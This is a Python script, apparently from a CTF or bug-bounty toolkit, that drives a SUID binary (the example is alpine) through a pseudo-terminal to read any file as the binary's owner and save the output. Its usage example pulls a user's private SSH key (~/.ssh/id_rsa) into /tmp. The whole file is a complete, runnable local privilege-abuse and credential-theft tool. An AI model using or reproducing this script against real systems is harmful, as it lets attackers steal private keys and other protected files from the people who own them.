"""Extract a file from the filesystem using a SUID binary via Python PTY.

Usage:
    python3 -m bugbounty_ctf.alpine_pty_extract <suid_binary> <target_file> <output_file>

Example:
    python3 -m bugbounty_ctf.alpine_pty_extract /usr/bin/alpine /home/user/.ssh/id_rsa /tmp/key.txt
"""

from __future__ import annotations

import os
import pty
import select
import sys
import time
from contextlib import suppress


def extract_file(suid_binary: str, target_file: str, output_file: str, timeout: int = 10) -> bool:
    """Use a SUID binary (like alpine) to read a file as its owner.

    Args:
        suid_binary: Path to the SUID binary (e.g., /usr/bin/alpine)
        target_file: File to read as SUID owner
        output_file: Where to save the extracted content
        timeout: Seconds to wait for output

    Returns:
        True if extraction succeeded (output file has content)
    """
    master, slave = pty.openpty()
    pid = os.fork()

    if pid == 0:
        # Child process
        os.close(master)
        os.setsid()

        sf = os.open(os.ttyname(slave), os.O_RDWR)
        os.dup2(sf, 0)
        os.dup2(sf, 1)
        os.dup2(sf, 2)
        if sf > 2:
            os.close(sf)
        os.close(slave)

        os.environ["HOME"] = "/dev/shm"  # Writable location for config files
        os.environ["TERM"] = "xterm"

        os.execve(suid_binary, [suid_binary, "-F", target_file], os.environ)
        # Should not reach here

    # Parent process
    os.close(slave)

    with open(output_file, "wb") as out:
        deadline = time.time() + timeout

        while time.time() < deadline:
            remaining = max(0.0, deadline - time.time())
            r, _, _ = select.select([master], [], [], remaining)
            if r:
                try:
                    data = os.read(master, 8192)
                    if not data:
                        break
                    out.write(data)
                    out.flush()
                except OSError:
                    break
            else:
                break

    with suppress(OSError):
        os.waitpid(pid, 0)

    return os.path.getsize(output_file) > 0


def main() -> None:
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <suid_binary> <target_file> <output_file>")
        print(f"Example: {sys.argv[0]} /usr/bin/alpine /home/user/.ssh/id_rsa /tmp/key.txt")
        sys.exit(1)

    suid_binary = sys.argv[1]
    target_file = sys.argv[2]
    output_file = sys.argv[3]

    if not os.path.exists(suid_binary):
        print(f"Error: SUID binary not found: {suid_binary}")
        sys.exit(1)

    print(f"Extracting {target_file} using {suid_binary}...")

    if extract_file(suid_binary, target_file, output_file):
        print(f"Success! Output saved to {output_file}")
        print(f"Size: {os.path.getsize(output_file)} bytes")
    else:
        print("Failed: No output captured")
        sys.exit(1)


if __name__ == "__main__":
    main()
